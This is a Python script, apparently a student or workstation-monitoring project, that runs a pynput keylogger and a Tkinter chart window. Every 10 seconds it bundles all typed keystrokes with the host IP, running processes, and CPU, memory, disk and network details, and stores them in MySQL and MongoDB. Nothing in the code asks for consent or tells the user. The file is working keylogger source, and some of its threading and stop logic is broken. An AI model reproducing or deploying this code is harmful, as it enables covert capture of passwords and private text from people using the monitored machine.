import threading
#from _testcapi import ipowType

#from prompt_toolkit.filters import in_paste_mode

from mongobd import conexion
import pynput.keyboard
import socket
import time
from datetime import datetime
from mysql import BasedeDatos
import subproceso
import platform
import DATOSPC
import consultas_mysql
from tkinter import *
from graficas import grafica

consulta = consultas_mysql

lista_tecla=[] #En esta lista se guardaran las palabras

controlador = True
sub = subproceso
datos = DATOSPC
graf = grafica()
contador = True
mongo_conexion = conexion()#Hacer conexion con la base de mongo
mysql_conexion = BasedeDatos()#Hace la conexion con mysql

def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso,info,cpu,memoria,swap,disco,red):
    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso,info,cpu,memoria,swap,disco,red)

def imprimir():
    tecla = ''.join(lista_tecla)
    #2.SEGUNDO PASO
    return tecla

def presiona(key):
    key1 = convertir(key)
    #Key es con la letra k en mayuscula
    if key1 == "Key.esc":
        print("Saliendo...")
        #imprimir()#imprime en el documento txt
        #extrar_informacion()
        return False
        #liste.stop()
    #Si es igual al espacio
    elif key1 == "Key.space":
        lista_tecla.append(" ")
    #si le da un enter
    elif key1 == "Key.enter":
        lista_tecla.append("\n")
    #Si borra que no aparesca nada
    elif key1 == "Key.backspace":
        lista_tecla.append(" borro ")
    #Si es igual a una letra
    else:
        lista_tecla.append(key1)

def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def ciclo_ejecucion():
    while contador:

        #1.PRIMER PASO
        ip_equipo = socket.gethostbyname(socket.gethostname())
        #ejecucion actual
        tiempo_inicial = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        time.sleep(10)
        lo_escrito = imprimir()
        tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        #Ejecucion mysql
        consulta.insertar_ejecucion(tiempo_inicial,tiempo_final,ip_equipo)

        #Ultimos procesos mysql
        sub.ultimos_procesos_matriz(consulta.obtener_ultimo_id("ejecucion"))

        sub_proceso = sub.ultimos_procesos()
        
        infoCPU = datos.informacion_CPU()
        infoMemoria = datos.informacion_Memoria()
        infoMemoriaSWAP = datos.informacion_MemoriaSWAP()
        disco = datos.Disco_Duro()
        red = datos.infoRED()
        infopc = datos.informacion_sistema()
        consulta.insertar_InfoSistema(consulta.obtener_ultimo_id("ejecucion"),infopc)
        consulta.insertar_InfoCPU(consulta.obtener_ultimo_id("ejecucion"),infoCPU)
        consulta.insertar_InfoMemoria(consulta.obtener_ultimo_id("ejecucion"),infoMemoria)
        consulta.insertar_InfoSWAP(consulta.obtener_ultimo_id("ejecucion"),infoMemoriaSWAP)
        consulta.insertar_InfoDiscoDuro(consulta.obtener_ultimo_id("ejecucion"),disco)
        consulta.insertar_InfoRedes(consulta.obtener_ultimo_id("ejecucion"),red)
        agregarBD_mongo(ip_equipo,tiempo_inicial,lo_escrito,tiempo_final,sub_proceso,infopc,infoCPU,infoMemoria,infoMemoriaSWAP,disco,red)
        lista_tecla.clear()

def rgb_hack(rgb):
    return "#%02x%02x%02x" % rgb
def detener():
    contador = False


def interfaz():
    root = Tk()
    root.title("Control equipo")
    root.geometry("200x200")
    colorFondo = "#006"
    colorLetra = "#FFF"
    tituloEtiqueta = Label(root, text="MySQL", fg=colorLetra, bg=colorFondo).pack()
    botonGuardar = Button(root, text="Grafica barras", fg=colorLetra, bg=rgb_hack((50, 130, 184)),
                          command=graf.grafica_barras_mysql).pack()

    tituloEtiqueta_2 = Label(root, text="MongoDB", fg=colorLetra, bg=colorFondo).pack()
    botonGuardar_2 = Button(root, text="Grafica barras", fg=colorLetra, bg=rgb_hack((50, 130, 184)),
                            command=graf.grafica_barras).pack()

    root.configure(bg=rgb_hack((15, 76, 117)))
    root.mainloop()


hilo2 = threading.Thread(target=interfaz).start()
with pynput.keyboard.Listener(on_press=presiona) as liste:
    hilo = threading.Thread(target=ciclo_ejecucion()).start()
    liste.join()
	